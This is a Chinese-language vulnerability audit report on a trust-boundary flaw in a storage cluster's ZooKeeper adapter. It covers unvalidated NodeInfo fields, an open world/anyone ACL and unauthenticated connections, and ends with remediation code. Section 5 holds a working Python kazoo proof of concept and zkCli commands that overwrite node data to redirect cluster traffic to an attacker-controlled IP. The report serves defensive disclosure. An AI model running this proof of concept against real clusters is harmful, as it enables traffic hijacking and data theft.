# CLUSTER-TRUSTBOUND-005: 信任边界违规致ZooKeeper节点信息未经验证直接使用

## 一、漏洞概述

| 属性 | 值 |
|------|-----|
| 漏洞ID | CLUSTER-TRUSTBOUND-005 |
| 类型 | Trust Boundary Violation (信任边界违规) |
| CWE | CWE-501: Trust Boundary Violation |
| 严重性 | HIGH |
| 文件 | ubsio-boostio/src/cluster/common/cm_zkadapter.c |
| 影响行号 | 480-507 (CmClientZkGetNodeInfo) |
| 置信度 | 85% (已确认真实漏洞) |

## 二、漏洞确认分析

### 2.1 漏洞代码位置

**CmClientZkGetNodeInfo 函数 (行 480-507):**
```c
int32_t CmClientZkGetNodeInfo(uint16_t poolId, NodeInfo *nodeInfo)
{
    char zkPath[CM_ZNODE_PATH_LEN] = { 0 };
    int32_t ret;

    int32_t len = (int32_t)sizeof(NodeInfo);

    ret = sprintf_s(zkPath, CM_ZNODE_PATH_LEN, "%s/%u/%s/%u", CM_POOL, poolId, CM_NODE_INFO_PATH, nodeInfo->nodeId);
    if (ret < 0) {
        CM_LOGERROR("Sprintf_s path failed, ret(%d).", ret);
        return CM_ERR;
    }

    // 从 ZooKeeper 直接读取结构体数据 - 无完整验证
    ret = CmZkGet(g_zh, zkPath, UNWATCH_ZNODE, (char *)nodeInfo, &len, NULL);
    if (ret != ZOK && ret != ZNONODE) {
        CM_LOGINFO("Get znode(%s) failed, ret(%d).", zkPath, ret);
        return CM_ERR;
    }
    if (ret == ZNONODE) {
        return CM_NOT_EXIST;
    }
    // 仅部分验证
    size_t ipLen = strnlen(nodeInfo->ipv4AddrStr, IP_ADDR_LEN);
    if (nodeInfo->diskList.num > DISK_LIST_NUM || ipLen == 0 || ipLen >= IP_ADDR_LEN) {
        CM_LOGERROR("Disk list get from zk exceeds max disk number or wrong ip addr ret(%d)", ret);
        return CM_ERR;
    }

    return CM_OK;  // 未验证的数据被返回使用
}
```

### 2.2 信任边界分析

**数据来源：ZooKeeper (外部信任边界)**
```
┌─────────────────────────────────────────────────────────────────┐
│                     Trust Boundary                              │
│                                                                 │
│  ┌──────────────┐         ┌──────────────────────────────────┐ │
│  │   ZooKeeper  │  ────→  │        Application              │ │
│  │  (External)  │         │  ┌────────────────────────────┐ │ │
│  │              │         │  │ CmClientZkGetNodeInfo()   │ │ │
│  │  /cm/pool/   │         │  │ - 直接反序列化 NodeInfo   │ │ │
│  │  node_info   │         │  │ - 部分字段验证            │ │ │
│  │              │         │  │ - 用于集群节点发现        │ │ │
│  └──────────────┘         │  └────────────────────────────┘ │ │
│                           └──────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

**关键问题：ZooKeeper 数据被视为可信数据直接使用**

### 2.3 NodeInfo 结构体分析

**定义位置: cm_inner.h (行 189-197):**
```c
typedef struct {
    uint16_t nodeId;            // 未验证!
    uint16_t port;              // 未验证!
    uint16_t status;            // 未验证! (见 NodeStatus)
    uint16_t resv;              // 未验证!
    char ipv4AddrStr[IP_ADDR_LEN]; // 仅长度验证
    DiskList diskList;          // 仅 num 验证, list 内容未验证
    NetList netList;            // 完全未验证!
} NodeInfo;
```

**验证缺失字段:**
| 字段 | 当前验证 | 风险 |
|------|----------|------|
| nodeId | 无 | 可被篡改用于身份伪造 |
| port | 无 | 可被篡改用于端口劫持 |
| status | 无 | 可被篡改控制节点状态判断 |
| diskList.list[] | 无 | diskId/state 可被篡改 |
| netList.num | 无 | 可能导致数组越界 |
| netList.list[] | 无 | ipv4Addr/port/state 可被篡改 |

### 2.4 ZooKeeper ACL 安全问题

**关键安全缺陷: ZOO_OPEN_ACL_UNSAFE**

**定义位置: cm_zkadapter.c (行 44-45):**
```c
static struct ACL OPEN_ACL_UNSAFE_ACL[] = {{0x1f, {"world", "anyone"}}};
struct ACL_vector ZOO_OPEN_ACL_UNSAFE = {1, OPEN_ACL_UNSAFE_ACL};
```

**ACL 解析:**
- `"world", "anyone"` = 对任何连接者有效
- `0x1f` (31) = 所有权限 (READ + WRITE + CREATE + DELETE + ADMIN + SET_ACL)

**含义: 任何能连接 ZooKeeper 的客户端都可以完全读写所有集群数据!**

### 2.5 ZooKeeper 连接无认证

**初始化代码: cm_zkadapter.c (行 2405-2434):**
```c
static int32_t CmZkConnect(void)
{
    const char *zkServerIp = CmConfigGetZkServerList();
    int timeOut = (int)CmConfigGetTimeOut();

    // Set debug level
    ZooSetDebugLevel(ZOO_LOG_LEVEL_ERROR);
    
    // Initialize zookeeper connection - 无认证参数!
    g_zh = ZookeeperInit(zkServerIp, CmZkWatchFunc, timeOut, NULL, NULL, 0);
    // ...
}
```

**缺失的安全措施:**
- 无 `zoo_add_auth()` 调用 (digest/SASL 认证)
- 无 TLS/SSL 配置
- 无 IP 白名单检查

## 三、数据流分析

### 3.1 完整数据流路径

```
[攻击者写入恶意数据到 ZooKeeper]
         ↓
ZooKeeper znode: /cm/pool/{poolId}/node_info/{nodeId}
         ↓
CmZkGet() 返回 ZOK (读取成功)
         ↓
nodeInfo 结构体被填充 (包含恶意数据)
         ↓
[仅部分字段验证] - nodeId/port/netList 完全未验证
         ↓
CM_GetNodeInfo() 返回成功
         ↓
NotifyNodeListChange() 回调
         ↓
Cm::NotifyNodeListChange() 处理节点信息
         ↓
cm->mNodeInfos[id] = node;  // 存入集群节点视图
         ↓
业务层使用 node.ip/node.port 进行网络连接
         ↓
[可能连接到攻击者控制的恶意节点]
```

### 3.2 关键调用路径

**CM_GetNodeInfo → CmClientZkGetNodeInfo:**
```c
// cm_client_local.c 行 39-55
int32_t CM_GetNodeInfo(uint16_t poolId, NodeInfo *nodeInfo)
{
    PoolInfo *pool = CmConfigGetPoolInfo(poolId);

    if (poolId >= MAX_POOL_NUM || pool == NULL || nodeInfo == NULL) {
        CM_LOGERROR("Invalid param, poolId(%u).", poolId);
        return CM_ERR;
    }

    int32_t ret = CmClientZkGetNodeInfo(poolId, nodeInfo);
    // 数据用于集群节点发现...
}
```

**Cm::NotifyNodeListChange 使用未验证数据:**
```c
// cm.cpp 行 232-256
NodeInfo info;
info.nodeId = nodeList->nodeList[index].nodeId;
int ret = CM_GetNodeInfo(nodeList->poolId, &info);
// ...

CmNodeId id;
CmNodeInfo node;
id.groupId = nodeList->poolId;
id.nodeId = nodeList->nodeList[index].nodeId;
node.id = id;
node.ip = info.ipv4AddrStr;    // 使用未验证的 IP
node.port = info.port;         // 使用未验证的端口
// ...
cm->mNodeInfos[id] = node;    // 存入集群节点视图
```

## 四、攻击场景分析

### 4.1 攻击前置条件评估

| 条件 | 可行性 | 说明 |
|------|--------|------|
| ZooKeeper 网络可达 | 高 | ZooKeeper 通常部署在内网，内网攻击者可达 |
| ZooKeeper ACL 开放 | **已确认** | ZOO_OPEN_ACL_UNSAFE 允许任何人写入 |
| 无认证机制 | **已确认** | ZookeeperInit 无认证参数 |
| 知晓数据结构 | 中 | 可通过逆向或源码分析获取 |

### 4.2 攻击场景一：节点信息篡改

**目标: 将集群流量重定向到恶意节点**

**攻击步骤:**
1. 攻击者获取 ZooKeeper 网络访问权限 (内网渗透)
2. 连接到 ZooKeeper: `zkCli.sh -server zk_host:2181`
3. 获取现有节点信息:
   ```bash
   get /cm/pool/0/node_info/1
   ```
4. 修改节点 IP/端口指向攻击者控制的机器:
   ```bash
   # 构造恶意 NodeInfo 结构体
   # 修改 ipv4AddrStr 为攻击者 IP
   # 修改 port 为攻击者监听端口
   set /cm/pool/0/node_info/1 <malicious_nodeinfo_binary>
   ```
5. 集群节点订阅到变更 (ZOO_CHANGED_EVENT)
6. CmClientZkGetNodeInfo 读取恶意数据
7. 验证通过 (IP 字符串长度正常, diskList.num 在范围内)
8. 集群将流量发送到攻击者节点

**攻击效果:**
- 数据被发送到恶意节点
- 可实现数据窃取
- 可实现数据篡改
- 可能实现远程代码执行

### 4.3 攻击场景二：主节点选举操纵

**目标: 控制集群主节点选举**

**攻击路径:**
1. 修改 `/cm/meta/master` 节点数据
2. 指定恶意 nodeId 为主节点
3. 触发角色变更通知
4. 恶意节点获得 MASTER 角色
5. 可控制整个集群的分区表计算

### 4.4 攻击场景三：分区表篡改

**目标: 控制数据分布**

**攻击路径:**
1. 修改 `/cm/pool/{poolId}/pt` PtEntryList 数据
2. 设置恶意 PtEntry 的 copyList 指向攻击者节点
3. 集群根据 PtEntryList 进行数据分布
4. 数据副本被存储到攻击者节点

## 五、PoC 构造思路

### 5.1 环境准备

**需要工具:**
```bash
# ZooKeeper 客户端
zkCli.sh

# Python kazoo 库
pip install kazoo
```

### 5.2 PoC 代码设计

**Python PoC - 节点信息篡改:**
```python
from kazoo.client import KazooClient
import struct

# 连接 ZooKeeper
zk = KazooClient(hosts='zk_server:2181')
zk.start()

# NodeInfo 结构体定义 (来自 cm_inner.h)
# typedef struct {
#     uint16_t nodeId;     // offset 0
#     uint16_t port;       // offset 2
#     uint16_t status;     // offset 4
#     uint16_t resv;       // offset 6
#     char ipv4AddrStr[16];// offset 8, 16 bytes
#     DiskList diskList;   // offset 24
#     NetList netList;     // offset ...
# } NodeInfo;

# 构造恶意 NodeInfo
def create_malicious_nodeinfo(node_id, attacker_ip, attacker_port):
    # 构造基本结构
    malicious = bytearray(200)  # 预分配足够空间
    
    # nodeId - 保持原值以匹配路径
    struct.pack_into('<H', malicious, 0, node_id)
    
    # port - 改为攻击者端口
    struct.pack_into('<H', malicious, 2, attacker_port)
    
    # status - 设置为 NODE_STATUS_OK
    struct.pack_into('<H', malicious, 4, 0)
    
    # ipv4AddrStr - 改为攻击者 IP (确保长度 < 16)
    attacker_ip_bytes = attacker_ip.encode('ascii')
    malicious[8:8+len(attacker_ip_bytes)] = attacker_ip_bytes
    
    # diskList.num - 设置为合理值 (必须 <= 16)
    struct.pack_into('<H', malicious, 24, 2)  # offset 需精确计算
    
    return bytes(malicious)

# 执行攻击
node_id = 1
attacker_ip = "192.168.1.100"  # 攻击者控制的 IP
attacker_port = 9999           # 攻击者监听端口

malicious_data = create_malicious_nodeinfo(node_id, attacker_ip, attacker_port)

# 写入恶意数据
zk.set('/cm/pool/0/node_info/1', malicious_data)

print(f"Injected malicious node info: {attacker_ip}:{attacker_port}")
zk.stop()
```

### 5.3 PoC 验证方法

**观察集群行为变化:**
```bash
# 监控日志
tail -f /var/log/cm.log | grep "NodeInfo"

# 检查节点视图
# 预期看到攻击者 IP 出现在集群节点列表中

# 网络流量分析
tcpdump -i any port 9999
# 预期看到来自集群节点的连接尝试
```

## 六、实际可利用性评估

### 6.1 可利用性评级

| 因素 | 评级 | 说明 |
|------|------|------|
| ZooKeeper 可达性 | 中等-高 | 内网攻击者可达 |
| ACL 无保护 | **已确认** | ZOO_OPEN_ACL_UNSAFE |
| 无认证 | **已确认** | 代码无认证逻辑 |
| 数据结构已知 | 中等 | 开源代码可分析 |
| 攻击复杂度 | 低 | 直接修改 znode 数据 |
| 影响范围 | 高 | 整个集群受影响 |

### 6.2 综合评级: **高危**

**理由:**
1. **信任边界明确违规**: ZooKeeper 数据被直接信任使用
2. **验证严重不完整**: nodeId/port/netList 完全未验证
3. **ACL 完全开放**: 任何客户端可读写
4. **无认证机制**: 无身份验证
5. **影响严重**: 可实现流量劫持、数据窃取

### 6.3 利用限制

- 需要内网访问 ZooKeeper
- 需要了解数据结构格式
- 需要攻击者能接收被劫持的流量
- 在生产环境可能触发告警

## 七、修复建议

### 7.1 完整数据验证

**建议在 CmClientZkGetNodeInfo 中添加完整验证:**
```c
int32_t CmClientZkGetNodeInfo(uint16_t poolId, NodeInfo *nodeInfo)
{
    // ... 现有代码 ...

    // 完整验证
    size_t ipLen = strnlen(nodeInfo->ipv4AddrStr, IP_ADDR_LEN);
    if (ipLen == 0 || ipLen >= IP_ADDR_LEN) {
        CM_LOGERROR("Invalid IP address length.");
        return CM_ERR;
    }

    // 验证 nodeId 范围
    PoolInfo *pool = CmConfigGetPoolInfo(poolId);
    if (nodeInfo->nodeId >= pool->maxNodeNum) {
        CM_LOGERROR("Invalid nodeId(%u) exceeds max(%u).", nodeInfo->nodeId, pool->maxNodeNum);
        return CM_ERR;
    }

    // 验证 port 范围
    if (nodeInfo->port == 0 || nodeInfo->port > 65535) {
        CM_LOGERROR("Invalid port(%u).", nodeInfo->port);
        return CM_ERR;
    }

    // 验证 status
    if (nodeInfo->status != NODE_STATUS_OK && nodeInfo->status != NODE_STATUS_UNOK) {
        CM_LOGERROR("Invalid status(%u).", nodeInfo->status);
        return CM_ERR;
    }

    // 验证 diskList
    if (nodeInfo->diskList.num > DISK_LIST_NUM) {
        CM_LOGERROR("Invalid diskList.num(%u).", nodeInfo->diskList.num);
        return CM_ERR;
    }
    for (int i = 0; i < nodeInfo->diskList.num; i++) {
        if (nodeInfo->diskList.list[i].diskId >= DISK_ID_INVALID ||
            nodeInfo->diskList.list[i].state >= DISK_STATE_BUTT) {
            CM_LOGERROR("Invalid disk entry[%d].", i);
            return CM_ERR;
        }
    }

    // 验证 netList
    if (nodeInfo->netList.num > NET_LIST_NUM) {
        CM_LOGERROR("Invalid netList.num(%u).", nodeInfo->netList.num);
        return CM_ERR;
    }

    // 验证 IP 地址格式 (可选增强)
    // 检查是否为有效的 IPv4 格式

    return CM_OK;
}
```

### 7.2 ZooKeeper 安全加固

**启用 ZooKeeper 认证:**
```c
static int32_t CmZkConnect(void)
{
    // ... 现有连接代码 ...

    // 添加 digest 认证
    int ret = zoo_add_auth(g_zh, "digest", "username:password", 
                           strlen("username:password"), NULL, NULL);
    if (ret != ZOK) {
        CM_LOGERROR("ZooKeeper auth failed, ret(%d).", ret);
        return CM_ERR;
    }

    return CM_OK;
}
```

**修改 ACL 为受限 ACL:**
```c
// 替换 ZOO_OPEN_ACL_UNSAFE
static struct ACL CREATOR_ALL_ACL[] = {{ZOO_PERM_ALL, {"auth", ""}}};
struct ACL_vector ZOO_CREATOR_ALL_ACL = {1, CREATOR_ALL_ACL};
```

### 7.3 网络层安全

**建议措施:**
1. ZooKeeper 部署在独立安全网络区域
2. 启用 ZooKeeper SSL/TLS (如果支持)
3. 配置防火墙规则限制 ZooKeeper 访问
4. 监控异常的 ZooKeeper 操作

### 7.4 临时缓解措施

**在无法修改代码时:**
```bash
# 使用 ZooKeeper ACL 限制写入
zkCli.sh
setAcl /cm/pool auth:cm_user:crdwa
setAcl /cm/meta auth:cm_user:crdwa

# 网络隔离
iptables -A INPUT -p tcp --dport 2181 -s <trusted_hosts> -j ACCEPT
iptables -A INPUT -p tcp --dport 2181 -j DROP
```

## 八、相关漏洞关联

### 8.1 CLUSTER-INPUTVAL-002 关联

本漏洞与 CLUSTER-INPUTVAL-002 存在关联:
- CLUSTER-INPUTVAL-002: 验证逻辑短路导致验证被绕过
- CLUSTER-TRUSTBOUND-005: 验证本身不完整

两者结合可能导致更严重的安全问题。

### 8.2 其他受影响函数

同一信任边界问题可能存在于:
- `CmServerZkGetNodeInfo` (行 1609-1628)
- `CmServerZkGetNodeList` (行 1549-1567)
- `CmServerZkGetStateList` (行 1569-1587)
- `CmServerZkGetPtEntryList` (行 1589-1607)
- `CmClientZkGetNodeState` (行 420-477)

建议对所有从 ZooKeeper 获取数据的函数进行完整验证审计。

## 九、结论

**CLUSTER-TRUSTBOUND-005 是一个真实的高危漏洞。**

该漏洞的核心问题是:
1. **信任边界违规**: ZooKeeper 作为外部数据源，其数据被直接信任使用
2. **验证不完整**: 仅验证部分字段，关键字段如 nodeId/port/netList 完全未验证
3. **ACL 无保护**: 使用 ZOO_OPEN_ACL_UNSAFE，任何客户端可读写
4. **无认证机制**: ZooKeeper 连接无身份验证

攻击者利用此漏洞可以:
1. 篡改节点信息，将流量重定向到恶意节点
2. 控制集群主节点选举
3. 操控分区表分布
4. 实现数据窃取或篡改

建议立即实施:
1. 完整数据验证
2. ZooKeeper 认证
3. 限制 ACL 权限
4. 网络层隔离

---

**分析完成日期:** 2026-04-20
**分析工具:** 人工代码审计 + 数据流分析
